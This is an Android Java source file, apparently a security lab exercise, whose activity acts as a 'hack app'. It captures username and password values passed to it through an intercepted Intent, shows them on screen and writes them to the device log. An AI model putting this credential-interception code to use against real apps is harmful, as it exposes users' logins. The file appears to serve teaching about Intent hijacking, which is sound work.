package and402lab3_login.nhut.and402.lab.and402lab3_hacklogin;

import android.app.Activity;
import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent i = getIntent();
        if (i.getStringExtra("username") != null && i.getStringExtra("password") != null) {
            Toast.makeText(this, "Hack app got the username " + i.getStringExtra("username")
                    + " and password " + i.getStringExtra("password") +
                    " by mistake of user", Toast.LENGTH_LONG).show();

            Log.i("MyTag", "Hack app got the username " + i.getStringExtra("username")
                    + " and password " + i.getStringExtra("password"));
            finish();
        }
        finish();
    }

}
